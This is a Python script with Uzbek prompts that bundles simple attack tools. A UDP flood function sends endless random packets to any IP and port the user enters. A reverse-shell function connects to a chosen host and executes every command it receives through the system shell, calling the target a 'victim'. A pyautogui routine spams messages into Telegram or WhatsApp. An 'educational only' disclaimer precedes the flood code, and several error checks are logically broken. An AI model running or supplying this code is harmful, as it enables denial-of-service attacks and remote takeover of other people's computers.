#Tuzuvchi Asadbek Abdubannopov
#Yangilangan sana: 08/30/2023 10:41

def runddos():
    import socket,os,time,random 
    os.system('cls')
    
    
    print("Bu o'quv maqsadida holos. Har kim qilayotgan ishiga o'zi javob beradi.\nSiz qilayotgan ishingizga dasturchi aybdor emas!")
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    packet=random._urandom(21110)

    port=int(input("--[#]-- Istalgan portingizni kiriting:  "))

    ip=input("--[#]-- Nishon IP adressini kiritning:  ")

    sent=0

    while True:
       s.sendto(packet,(ip,port))
       sent+=1
       print("--[#]-- DDOS HUJUM QILINYAPTI {} port - {} ip - {} Packetlar soni".format(port,ip,sent))


def runping():
    print("Xatolik yuz berdi! Yoki kodlar mavjud emas!")

def run_sms():
    import pyautogui
    import time
    print("Cheksiz so'zlar yozib do'stlaringizni lol qoldiring!")
    print("Ishlamoqda.....")

    
    xabar = input("Xabar yozing\n>>")
    nechta = int(input("Necha marta takrorlansin>> "))
    print("Tayyorlaning 10 sekund(Telegram, yoki WHatsappga kirib oling. Do'stingizni akkauntini tanlang. Mana sizga cheksiz so'zlar)")
    print("Dasturni to'xtatish uchun (CTRL+C)")
    time.sleep(10)
    
    for i in range(nechta):
        pass
    while nechta > 0:
        nechta -=1
    
    pyautogui.typewrite(xabar.strip())
    pyautogui.press('enter')


def pc_attack():
    import socket
    import subprocess
    import os
    server = socket.socket()
    host = str(input("Kompyuterdi IP sini yozing:  "))   ## shu kopni ip adresssi
    if OSError:
        print("No internet connection!")
        os.system('exit')
    port = int(input("Portini kiriting:  "))
    server.connect((host, port))
    if socket.gaierror:
        print("No internet connection")
    run = True
    while run:

        xabar = server.recv(1024)
        result = subprocess.call(xabar.decode('UTF-8'),shell=True,universal_newlines=True)   ## command prompt windows terminal
        # result = subprocess.call(xabar.decode('UTF-8'), shell=True, universal_newlines=True)
        result = str(result)
        server.send('Qurbon online holatda ->>>'.encode('UTF-8'))







         

    
